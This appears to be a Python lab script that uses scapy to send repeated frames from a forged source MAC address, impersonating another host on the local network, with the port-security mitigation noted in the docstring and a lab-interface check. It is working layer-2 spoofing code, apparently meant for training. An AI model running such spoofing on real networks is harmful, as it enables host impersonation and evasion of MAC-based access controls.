#!/usr/bin/env python3
"""L2 SPOOFING: send traffic from a forged source MAC to impersonate another
host. Mitigation: port-security sticky/violation (see README)."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok  # noqa: E402


def build_frame(scapy_all, spoof_mac, dst_ip):
    Ether, IP, ICMP = scapy_all.Ether, scapy_all.IP, scapy_all.ICMP
    return Ether(src=spoof_mac, dst="ff:ff:ff:ff:ff:ff") / IP(dst=dst_ip or "255.255.255.255") / ICMP()


def main():
    p = base_parser("Send frames from a forged source MAC")
    p.add_argument("--spoof_mac", default="02:00:00:aa:bb:cc", help="source MAC to forge")
    p.add_argument("--target_ip", default="", help="destination IP (optional; broadcast if blank)")
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    pkt = build_frame(scapy_all, args.spoof_mac, args.target_ip)
    if args.selftest:
        selftest_ok("mac_spoof", "forged-src frame len=%d src=%s" % (len(bytes(pkt)), args.spoof_mac))
        return

    def send(n):
        scapy_all.sendp(build_frame(scapy_all, args.spoof_mac, args.target_ip), iface=args.iface, verbose=0)
        status("SENT", "frame #%d src=%s dst=%s" % (n + 1, args.spoof_mac, args.target_ip or "255.255.255.255"))

    run_loop(args.count, args.interval, send)


if __name__ == "__main__":
    main()

